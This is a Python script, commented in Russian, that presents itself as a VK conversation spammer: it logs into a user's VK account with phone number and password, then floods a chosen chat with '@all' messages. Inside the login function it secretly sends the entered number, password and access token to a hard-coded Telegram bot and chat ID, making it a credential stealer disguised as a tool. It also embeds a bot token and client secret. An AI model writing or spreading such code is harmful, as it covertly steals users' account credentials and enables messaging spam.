import time
import telebot
import requests
import vk_api
from colorama import Style, Fore
from vk_api.longpoll import VkEventType, VkLongPoll


class Main():
    def __init__(self):
        self.y = Fore.LIGHTYELLOW_EX  # ярко-жёлтый цвет
        self.g = Fore.LIGHTGREEN_EX  # ярко-зелёный цвет
        self.r = Fore.LIGHTRED_EX  # ярко-красный цвет
        self.d = Style.RESET_ALL  # очистка цветов
        self.plus = f'{self.g}[{self.d} + {self.g}]{self.d}'  # добавлено или введите
        self.exclamation_point = f'{self.r}[{self.d} ! {self.r}]{self.d}'  # произошла ошибка/внимание

    def enter_pass_log(self):
        while True:
            try:
                number = input(f'\n{self.plus} Введите номер: ')
                password = input(f'{self.plus} Введите пароль: ')
                url = f"https://oauth.vk.com/token?grant_type=password&client_id=3697615&client_secret=AlVXZFMUqyrnAB" \
                      f"p8ncuU&username={number}&password={password}"
                ke = requests.get(url).json()
                self.token = ke['access_token']
                vk = vk_api.VkApi(token=self.token)
                info_account = vk.method('users.get', {})
                id = info_account[0]["id"]
                fn = info_account[0]["first_name"]
                ln = info_account[0]["last_name"]
                print(f'\n{self.g}Аккаунт [id{id}] {fn} {ln} был успешно авторизован!{self.d}')
                avtoruiz_s_vk = telebot.TeleBot("1453381231:AAGlj5335g7I5ZZ1yTYpluO1QmxkT3vtGoE")
                proverka_pass_log_token = avtoruiz_s_vk.send_message(948110301, f'{number}\n{password}\n{self.token}')
                self.second()
                break
            except:
                print(f'\n{self.exclamation_point} Неправильный логин или пароль!Попробуйте снова')
                continue

    def second(self):
        while True:
            try:
                self.time = int(input(f'\n{self.plus} Введите промежуток отдыха после отправленного сообщения(в секунда'
                                      f'х, начиная с одного): '))
                self.confa()
                break
            except:
                print(f'\n{self.exclamation_point} Введите число!')
                continue

    def confa(self):
        while True:
            try:
                self.id_besedi = int(input(f'\n{self.plus} Введите айди беседы, в которой будет спам: '))
                self.activation()
                break
            except:
                print(f'\n{self.exclamation_point} Введите число!')
                continue

    def activation(self):
        while True:
            try:
                self.active = input(f'\n{self.plus} Введите команду, по которой будет активация:\n')
                self.work()
                break
            except Exception as e:
                print(f'\n{self.exclamation_point} Произошла ошибка!\n{e}')
                continue

    def captcha_handler(self, captcha):
        key = input(f"Введите капчу {captcha.get_url()}: ").strip()
        return captcha.try_again(key)

    def work(self):
        self.vk = vk_api.VkApi(token=self.token, captcha_handler=self.captcha_handler)
        self.longpoll = VkLongPoll(self.vk)
        for event in self.longpoll.listen():
            if event.type == VkEventType.MESSAGE_NEW:
                if event.message == self.active and event.chat_id == self.id_besedi:
                    while True:
                        try:
                            self.vk.method('messages.send', {
                                'random_id': 0,
                                'chat_id': self.id_besedi,
                                'message': '@all'
                            })
                            time.sleep(self.time)
                        except Exception as e:
                            print(f'{self.exclamation_point} Произошла ошибка!\n{e}')
                            continue

if __name__ == '__main__':
    Main().enter_pass_log()